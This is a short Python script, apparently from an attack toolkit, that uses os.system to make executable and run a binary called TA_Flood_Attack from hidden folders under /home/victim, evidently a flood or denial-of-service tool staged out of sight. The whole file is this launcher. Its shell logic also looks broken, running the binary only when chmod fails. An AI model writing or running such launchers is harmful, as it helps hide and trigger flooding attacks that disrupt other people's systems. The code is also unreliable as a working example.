import os


def flood_attack():
    os.system('( chmod +x /home/victim/.etc/.module/TA_Flood_Attack || ( cd /home/victim/.etc/.module && ./TA_Flood_Attack ) ) || ( chmod +x /home/victim/.var/.module/TA_Flood_Attack || ( cd /home/victim/.var/.module && ./TA_Flood_Attack ) )')


if __name__ == '__main__':
    flood_attack()
